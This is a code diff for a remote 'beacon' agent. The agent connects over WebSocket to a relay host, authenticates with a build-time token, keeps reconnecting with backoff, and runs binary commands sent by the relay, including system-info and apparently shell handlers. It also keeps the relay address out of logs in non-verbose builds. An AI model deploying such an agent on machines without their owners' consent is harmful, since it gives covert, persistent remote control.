@@ -2,6 +2,7 @@
 #include "runtime.h"
 #include "websocket_client.h"
 #include "shell.h"
+#include "platform/system/environment.h"
 
 static const CHAR *CommandTypeName(UINT8 type)
 {
@@ -30,12 +31,68 @@ static const CHAR *CommandTypeName(UINT8 type)
     }
 }
 
+#ifndef AGENT_RELAY_URL
+#define AGENT_RELAY_URL "https://relay.nostdlib.workers.dev/agent"
+#endif
+
+// Deploy token minted per-build (../scripts/auth/mint-deploy-token.mjs, signed by the
+// operator key) and baked in via CMake (AGENT_DEPLOY_TOKEN). Sent on every /agent
+// connect as the X-Deploy-Token header so the relay authenticates the upgrade. An
+// empty default compiles but the relay will reject the enrollment attempt — deploy.sh
+// and docker-build.sh fail fast before that happens, so this is just a build fallback.
+#ifndef AGENT_DEPLOY_TOKEN
+#define AGENT_DEPLOY_TOKEN ""
+#endif
+
+// Exponential reconnect backoff bounds (milliseconds).
+static constexpr UINT32 BACKOFF_FLOOR_MS = 1000;
+static constexpr UINT32 BACKOFF_CEIL_MS = 30000;
+
+// 0 (no prior failure) -> floor; otherwise double, capped at the ceiling.
+static UINT32 NextBackoffMs(UINT32 current)
+{
+    if (current == 0) return BACKOFF_FLOOR_MS;
+    return current >= (BACKOFF_CEIL_MS / 2) ? BACKOFF_CEIL_MS : current * 2;
+}
+
+// Freestanding busy-wait sleep (no libc/syscall-sleep dependency; matches the
+// codebase's monotonic-clock polling pattern). Used only between failed
+// connection attempts — never on the hot path.
+static void SleepMs(UINT32 ms)
+{
+    const UINT64 deadline = DateTime::GetMonotonicNanoseconds() + (UINT64)ms * 1000000ULL;
+    while (DateTime::GetMonotonicNanoseconds() < deadline) { /* busy-wait */ }
+}
+
 INT32 start()
 {
-    const CHAR url[] = "https://relay.nostdlib.workers.dev/agent";
+    // Resolve relay URL: command line (--relay) > env var (PIA_RELAY) > baked AGENT_RELAY_URL.
+    // The baked default is the Epic 1 deploy model (RELAY_URL baked at build via CMake);
+    // --relay / PIA_RELAY let an operator override it at runtime without rebuilding.
+    [[maybe_unused]] const CHAR *url;  // for logging (%s); only read in AGENT_VERBOSE_LOG builds
+    Span<const CHAR> urlSpan;      // for WebSocketClient::Create (takes Span, not a raw pointer)
+    CHAR urlBuf[512];
+    USIZE len = Environment::GetCommandLineValue("--relay", Span<CHAR>(urlBuf, sizeof(urlBuf)));
+    if (len == 0)
+        len = Environment::GetVariable("PIA_RELAY", Span<CHAR>(urlBuf, sizeof(urlBuf)));
+    if (len > 0)
+    {
+        url = urlBuf;
+        urlSpan = Span<const CHAR>(urlBuf, len);
+#ifdef AGENT_VERBOSE_LOG
+        LOG_INFO("Relay URL (override): %s", (PCCHAR)url);
+#endif
+    }
+    else
+    {
+        url = AGENT_RELAY_URL;  // baked fallback (Epic 1 deploy)
+        urlSpan = Span<const CHAR>(AGENT_RELAY_URL);
+    }
+    const CHAR deployToken[] = AGENT_DEPLOY_TOKEN;
 
     Context context;
     UINT32 connectionAttempt = 0;
+    UINT32 backoffMs = 0; // exponential reconnect backoff (0 = no prior failure)
 
     CommandHandler commandHandlers[CommandType::CommandTypeCount] = {nullptr};
     commandHandlers[CommandType::Command_GetSystemInfo] = Handle_GetSystemInfoCommand;
@@ -53,16 +110,32 @@ INT32 start()
     while (1)
     {
         connectionAttempt++;
+#ifdef AGENT_VERBOSE_LOG
         LOG_INFO("Connection attempt #%u to %s", connectionAttempt, (PCCHAR)url);
+#else
+        LOG_INFO("Connection attempt #%u", connectionAttempt);
+#endif
 
-        auto createResult = WebSocketClient::Create(url);
+        auto createResult = WebSocketClient::Create(urlSpan, deployToken);
         if (!createResult)
         {
+#ifdef AGENT_VERBOSE_LOG
             LOG_ERROR("Connection attempt #%u failed: unable to open WebSocket to %s", connectionAttempt, (PCCHAR)url);
-            return 0;
+#else
+            LOG_ERROR("Connection attempt #%u failed: unable to open WebSocket", connectionAttempt);
+#endif
+            backoffMs = NextBackoffMs(backoffMs);
+            LOG_INFO("Reconnecting in %ums (exponential backoff)", backoffMs);
+            SleepMs(backoffMs);
+            continue; // #61: retry instead of exiting on first connection failure
         }
+        backoffMs = 0; // connected — reset backoff
         WebSocketClient &wsClient = createResult.Value();
+#ifdef AGENT_VERBOSE_LOG
         LOG_INFO("WebSocket connection established (attempt #%u) to %s", connectionAttempt, (PCCHAR)url);
+#else
+        LOG_INFO("WebSocket connection established (attempt #%u)", connectionAttempt);
+#endif
 
         UINT32 messageCount = 0;
         while (1)
@@ -75,7 +148,34 @@ INT32 start()
                 break;
             }
 
+            // Relay heartbeat/control frames arrive as TEXT (e.g. {"type":"ping"}).
+            // The beacon speaks a binary command protocol, so a text frame is not a
+            // command — reply with a pong (keeps the relay's lastActiveAt fresh so it
+            // doesn't reap us as idle after 60s) and skip dispatch. Command traffic is binary.
+            if (readResult.Value().Opcode == WebSocketOpcode::Text)
+            {
+                const CHAR pong[] = "{\"type\":\"pong\"}";
+                LOG_DEBUG("Relay control frame (text), replying pong");
+                if (!wsClient.Write(Span<const CHAR>(pong, sizeof(pong) - 1), WebSocketOpcode::Text))
+                {
+                    LOG_ERROR("Failed to send pong, reconnecting...");
+                    break;
+                }
+                continue;
+            }
+
             messageCount++;
+
+            // Guard against zero-length / too-short frames: a 0-byte WS message has
+            // Data==nullptr, so command[0] would null-deref and commandLength would
+            // underflow to SIZE_MAX. Skip frames too small to carry a command byte.
+            if (readResult.Value().Length < sizeof(UINT8))
+            {
+                LOG_WARNING("Received a %u-byte frame; too small for a command byte — skipping",
+                            (UINT32)readResult.Value().Length);
+                continue;
+            }
+
             PCHAR command = (PCHAR)(readResult.Value().Data);
             UINT8 commandType = command[0];
             command++;
@@ -91,6 +191,11 @@ INT32 start()
             {
                 LOG_DEBUG("Dispatching command %s to handler", CommandTypeName(commandType));
                 commandHandlers[commandType](command, commandLength, &response, &responseLength, &context);
+                if (response == nullptr)
+                {
+                    LOG_ERROR("Command %s handler returned no response (out of memory)", CommandTypeName(commandType));
+                    continue;
+                }
                 UINT32 statusCode = *(PUINT32)response;
                 LOG_INFO("Command %s completed: status=%u, response_length=%u",
                          CommandTypeName(commandType), statusCode, (UINT32)responseLength);
@@ -100,6 +205,11 @@ INT32 start()
                 LOG_ERROR("Unknown command type 0x%02x received (max valid: 0x%02x), returning StatusUnknownCommand",
                           (UINT32)commandType, (UINT32)(CommandType::CommandTypeCount - 1));
                 response = new CHAR[responseLength];
+                if (response == nullptr)
+                {
+                    LOG_ERROR("Out of memory building unknown-command response");
+                    continue;
+                }
                 *(PUINT32)response = StatusCode::StatusUnknownCommand;
             }
 
